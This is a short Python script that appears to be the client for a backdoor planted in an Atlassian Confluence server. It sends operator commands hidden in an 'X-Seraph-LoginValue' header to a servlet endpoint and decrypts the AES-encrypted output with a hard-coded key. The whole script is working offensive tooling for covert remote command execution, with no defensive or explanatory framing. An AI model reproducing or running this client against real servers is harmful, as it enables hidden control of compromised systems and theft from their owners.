import base64
import requests
from Crypto.Cipher import AES

aes_secret = base64.b64decode("KTG45dtXspotBNa5PZuTxlS5Ddf3CZOEaHInRGggSmQ=")

while True:
    command = str.encode(input("confluence-client:# "))

    r = requests.post('http://localhost:8090/plugins/servlet/logger/admin',headers={'X-Seraph-LoginValue': base64.b64encode(command)})
    
    base64_ciphertext = r.text
    
    ciphertext = base64.b64decode(base64_ciphertext)
    
    iv = ciphertext[:16]
    
    encrypted_text = ciphertext[16:]
    
    
    cipher = AES.new(aes_secret, AES.MODE_CBC, iv=iv)
    plaintext = cipher.decrypt(encrypted_text)
    
    
    print(plaintext.decode('utf-8'))
